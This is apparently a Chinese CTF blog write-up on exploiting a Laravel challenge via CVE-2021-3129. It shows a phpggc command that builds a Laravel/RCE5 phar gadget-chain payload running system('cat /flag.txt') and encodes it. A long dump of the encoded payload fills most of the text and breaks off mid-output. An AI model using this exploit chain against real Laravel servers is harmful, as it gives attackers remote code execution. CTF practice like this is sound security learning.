<p>最开始的灵感来自<code>N1CTF2023</code>的<code>laravel</code>，<a target="_blank" rel="noopener" href="https://ctftime.org/writeup/38034">题解在这</a>。想着用它的exp一把梭，结果提示这个filter不存在/无法创建：</p>
<img src="/posts/10200/9.png" class title="awa">
<p>然后找到了另外一个洞：</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaoyunxiaogang/p/16913350.html">https://www.cnblogs.com/xiaoyunxiaogang/p/16913350.html</a></p>
<p>这个直接跟着链接打就可以了：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@aurora-virtual-machine:/home/aurora/桌面/CVE-<span class="number">2021</span>-<span class="number">3129</span><span class="comment"># php -d &quot;phar.readonly=0&quot; ./phpggc/phpggc Laravel/RCE5 &quot;system(&#x27;cat /flag.txt&#x27;);&quot; --phar phar -o php://output | base64 -w 0 | python3 -c &quot;import sys;print(&#x27;&#x27;.join([&#x27;=&#x27; + hex(ord(i))[2:] + &#x27;=00&#x27; for i in sys.stdin.read()]).upper())&quot;</span></span><br><span class="line"></span><br><span class="line">=<span class="number">50</span>=<span class="number">00</span>=<span class="number">44</span>=<span class="number">00</span>=<span class="number">39</span>=<span class="number">00</span>=<span class="number">77</span>=<span class="number">00</span>=<span class="number">61</span>=<span class="number">00</span>=<span class="number">48</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">67</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">31</span>=<span class="number">00</span>=<span class="number">39</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">51</span>=<span class="number">00</span>=<span class="number">55</span>=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">55</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">50</span>=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">42</span>=<span class="number">00</span>=<span class="number">4</span>A=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">45</span>=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">53</span>=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00</span>=<span class="number">43</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">37</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">44</span>=<span class="number">00</span>=<span class="number">38</span>=<span class="number">00</span>=<span class="number">2</span>B=<span class="number">00</span>=<span class="number">44</span>=<span class="number">00</span>=<span class="number">51</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">67</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">51</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">42</span>=<span class="number">00</span>=<span class="number">45</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">42</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">44</span>=<span class="number">00</span>=<span class="number">57</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">51</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">7</span>A=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">44</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">53</span>=<span class="number">00</span>=<span class="number">57</span>=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">73</span>=<span class="number">00</span>=<span class="number">64</span>=<span class="number">00</span>=<span class="number">57</span>=<span class="number">00</span>=<span class="number">31</span>=<span class="number">00</span>=<span class="number">70</span>=<span class="number">00</span>=<span class="number">62</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">46</span>=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">5</span>A=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">43</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">39</span>=<span class="number">00</span>=<span class="number">68</span>=<span class="number">00</span>=<span class="number">5</span>A=<span class="number">00</span>=<span class="number">47</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">68</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">33</span>=<span class="number">00</span>=<span class="number">52</span>=<span class="number">00</span>=<span class="number">70</span>=<span class="number">00</span>=<span class="number">62</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">64</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">55</span>=<span class="number">00</span>=<span class="number">47</span>=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">75</span>=<span class="number">00</span>=<span class="number">5</span>A=<span class="number">00</span>=<span class="number">47</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">75</span>=<span class="number">00</span>=<span class="number">5</span>A=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">4</span>A=<span class="number">00</span>=<span class="number">79</span>=<span class="number">00</span>=<span class="number">62</span>=<span class="number">00</span>=<span class="number">32</span>=<span class="number">00</span>=<span class="number">46</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">59</span>=<span class="number">00</span>=<span class="number">32</span>=<span class="number">00</span>=<span class="number">46</span>=<span class="number">00</span>=<span class="number">7</span>A=<span class="number">00</span>=<span class="number">64</span>=<span class="number">00</span>=<span class="number">43</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">6</span>A=<span class="number">00</span>=<span class="number">70</span>=<span class="number">00</span>=<span class="number">37</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">7</span>A=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">35</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00</span>=<span class="number">67</span>=<span class="number">00</span>=<span class="number">42</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">64</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">75</span>=<span class="number">00</span>=<span class="number">64</span>=<span class="number">00</span>=<span class="number">48</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">38</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">6</span>A=<span class="number">00</span>=<span class="number">55</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">73</span>=<span class="number">00</span>=<span class="number">62</span>=<span class="number">00</span>=<span class="number">48</span>=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">61</span>=<span class="number">00</span>=<span class="number">57</span>=<span class="number">00</span>=<span class="number">35</span>=<span class="number">00</span>=<span class="number">68</span>=<span class="number">00</span>=<span class="number">64</span>=<span class="number">00</span>=<span class="number">47</span>=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">51</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">7</span>A=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">45</span>=<span class="number">00</span>=<span class="number">52</span>=<span class="number">00</span>=<span class="number">70</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">33</span>=<span class="number">00</span>=<span class="number">42</span>=<span class="number">00</span>=<span class="number">68</span>=<span class="number">00</span>=<span class="number">64</span>=<span class="number">00</span>=<span class="number">47</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">5</span>A=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span>A=<span class="number">00</span>=<span class="number">45</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">65</span>=<span class="number">00</span>=<span class="number">33</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">59</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">67</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">71</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">48</span>=<span class="number">00</span>=<span class="number">46</span>=<span class="number">00</span>=<span class="number">31</span>=<span class="number">00</span>=<span class="number">5</span>A=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">55</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">7</span>A=<span class="number">00</span>=<span class="number">62</span>=<span class="number">00</span>=<span class="number">32</span>=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">32</span>=<span class="number">00</span>=<span class="number">5</span>A=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">32</span>=<span class="number">00</span>=<span class="number">45</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">6</span>A=<span class="number">00</span>=<span class="number">70</span>=<span class="number">00</span>=<span class="number">37</span>=<span class="number">00</span>=<span class="number">61</span>=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">77</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">38</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">6</span>A=<span class="number">00</span>=<span class="number">55</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">31</span>=<span class="number">00</span>=<span class="number">76</span>=<span class="number">00</span>=<span class="number">59</span>=<span class="number">00</span>=<span class="number">32</span>=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">47</span>=<span class="number">00</span>=<span class="number">39</span>=<span class="number">00</span>=<span class="number">68</span>=<span class="number">00</span>=<span class="number">5</span>A=<span class="number">00</span>=<span class="number">47</span>=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">79</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">45</span>=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">32</span>=<span class="number">00</span>=<span class="number">59</span>=<span class="number">00</span>=<span class="number">57</span>=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">62</span>=<span class="number">00</span>=<span class="number">32</span>=<span class="number">00</span>=<span class="number">46</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">5</span>A=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span>A=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">65</span>=<span class="number">00</span>=<span class="number">33</span>=<span class="number">00</span>=<span class="number">31</span>=<span class="number">00</span>=<span class="number">70</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span>A=<span class="number">00</span>=<span class="number">45</span>=<span class="number">00</span>=<span class="number">37</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">7</span>A=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>A=<span class="number">00</span>=<span class="number">73</span>=<span class="number">00</span>=<span class="number">62</span>=<span class="number">00</span>=<span class="number">32</span>=<span class="number">00</span>=<span class="number">46</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span>A=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">39</span>=<span class="number">00</span>=<span class="number">66</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">44</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">43</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">5</span>A=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">5</span>A=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">62</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">51</span>=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">38</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">7</span>A=<span class="number">00</span>=<span class="number">67</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">73</span>=<span class="number">00</span>=<span class="number">62</span>=<span class="number">00</span>=<span class="number">48</span>=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">61</span>=<span class="number">00</span>=<span class="number">57</span>=<span class="number">00</span>=<span class="number">35</span>=<span class="number">00</span>=<span class="number">68</span>=<span class="number">00</span>=<span class="number">64</span>=<span class="number">00</span>=<span class="number">47</span>=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">51</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">4</span>A=<span class="number">00</span>=<span class="number">76</span>=<span class="number">00</span>=<span class="number">59</span>=<span class="number">00</span>=<span class="number">57</span>=<span class="number">00</span>=<span class="number">52</span>=<span class="number">00</span>=<span class="number">6</span>A=<span class="number">00</span>=<span class="number">59</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">61</span>=<span class="number">00</span>=<span class="number">57</span>=<span class="number">00</span>=<span class="number">35</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">45</span>=<span class="number">00</span>=<span class="number">4</span>A=<span class="number">00</span>=<span class="number">79</span>=<span class="number">00</span>=<span class="number">62</span>=<span class="number">00</span>=<span class="number">32</span>=<span class="number">00</span>=<span class="number">46</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">59</span>=<span class="number">00</span>=<span class="number">32</span>=<span class="number">00</span>=<span class="number">46</span>=<span class="number">00</span>=<span class="number">7</span>A=<span class="number">00</span>=<span class="number">64</span>=<span class="number">00</span>=<span class="number">45</span>=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">32</span>=<span class="number">00</span>=<span class="number">5</span>A=<span class="number">00</span>=<span class="number">57</span>=<span class="number">00</span>=<span class="number">35</span>=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span>A=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">7</span>A=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span>A=<span class="number">00</span>=<span class="number">45</span>=<span class="number">00</span>=<span class="number">77</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>A=<span class="number">00</span>=<span class="number">6</span>A=<span class="number">00</span>=<span class="number">62</span>=<span class="number">00</span>=<span class="number">32</span>=<span class="number">00</span>=<span class="number">35</span>=<span class="number">00</span>=<span class="number">75</span>=<span class="number">00</span>=<span class="number">5</span>A=<span class="number">00</span>=<span class="number">57</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">61</span>=<span class="number">00</span>=<span class="number">57</span>=<span class="number">00</span>=<span class="number">39</span>=<span class="number">00</span>=<span class="number">75</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span>A=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">50</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span>A=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">79</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>A=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">62</span>=<span class="number">00</span>=<span class="number">32</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">72</span>=<span class="number">00</span>=<span class="number">5</span>A=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">4</span>A=<span class="number">00</span>=<span class="number">35</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">45</span>=<span class="number">00</span>=<span class="number">64</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">62</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">79</span>=<span class="number">00</span>=<span class="number">59</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">52</span>=<span class="number">00</span>=<span class="number">76</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">62</span>=<span class="number">00</span>=<span class="number">32</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">72</span>=<span class="number">00</span>=<span class="number">52</span>=<span class="number">00</span>=<span class="number">47</span>=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">61</span>=<span class="number">00</span>=<span class="number">57</span>=<span class="number">00</span>=<span class="number">35</span>=<span class="number">00</span>=<span class="number">70</span>=<span class="number">00</span>=<span class="number">64</span>=<span class="number">00</span>=<span class="number">47</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">76</span>=<span class="number">00</span>=<span class="number">62</span>=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">6</span>A=<span class="number">00</span>=<span class="number">70</span>=<span class="number">00</span>=<span class="number">37</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">7</span>A=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">35</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00</span>=<span class="number">67</span>=<span class="number">00</span>=<span class="number">42</span>=<span class="number">00</span>=<span class="number">6</span>A=<span class="number">00</span>=<span class="number">62</span>=<span class="number">00</span>=<span class="number">32</span>=<span class="number">00</span>=<span class="number">35</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">61</span>=<span class="number">00</span>=<span class="number">57</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">38</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">7</span>A=<span class="number">00</span>=<span class="number">55</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">31</span>=<span class="number">00</span>=<span class="number">76</span>=<span class="number">00</span>=<span class="number">59</span>=<span class="number">00</span>=<span class="number">32</span>=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">52</span>=<span class="number">00</span>=<span class="number">32</span>=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">75</span>=<span class="number">00</span>=<span class="number">5</span>A=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">4</span>A=<span class="number">00</span>=<span class="number">68</span>=<span class="number">00</span>=<span class="number">64</span>=<span class="number">00</span>=<span class="number">47</span>=<span class="number">00</span>=<span class="number">39</span>=<span class="number">00</span>=<span class="number">79</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">45</span>=<span class="number">00</span>=<span class="number">31</span>=<span class="number">00</span>=<span class="number">76</span>=<span class="number">00</span>=<span class="number">59</span>=<span class="number">00</span>=<span class="number">32</span>=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">44</span>=<span class="number">00</span>=<span class="number">62</span>=<span class="number">00</span>=<span class="number">32</span>=<span class="number">00</span>=<span class="number">35</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">61</span>=<span class="number">00</span>=<span class="number">57</span>=<span class="number">00</span>=<span class="number">64</span>=<span class="number">00</span>=<span class="number">31</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">46</span>=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">61</span>=<span class="number">00</span>=<span class="number">57</span>=<span class="number">00</span>=<span class="number">39</span>=<span class="number">00</span>=<span class="number">75</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span>A=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">7</span>A=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span>A=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">67</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">71</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">47</span>=<span class="number">00</span>=<span class="number">35</span>=<span class="number">00</span>=<span class="number">68</span>=<span class="number">00</span>=<span class="number">62</span>=<span class="number">00</span>=<span class="number">57</span>=<span class="number">00</span>=<span class="number">55</span>=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">33</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">7</span>A=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">59</span>=<span class="number">00</span>=<span class="number">57</span>=<span class="number">00</span>=<span class="number">4</span>A=<span class="number">00</span>=<span class="number">6</span>A=<span class="number">00</span>=<span class="number">5</span>A=<span class="number">00</span>=<span class="number">47</span>=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">5</span>A=<span class="number">00</span>=<span class="number">79</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">37</span>=<span class="number">00</span>=<span class="number">66</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">7</span>A=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">43</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">59</span>=<span class="number">00</span>=<span class="number">32</span>=<span class="number">00</span>=<span class="number">39</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">5</span>A=<span class="number">00</span>=<span class="number">53</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">37</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">7</span>A=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">7</span>A=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">50</span>=<span class="number">00</span>=<span class="number">44</span>=<span class="number">00</span>=<span class="number">39</span>=<span class="number">00</span>=<span class="number">77</span>=<span class="number">00</span>=<span class="number">61</span>=<span class="number">00</span>=<span class="number">48</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">67</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">33</span>=<span class="number">00</span>=<span class="number">6</span>C=<span 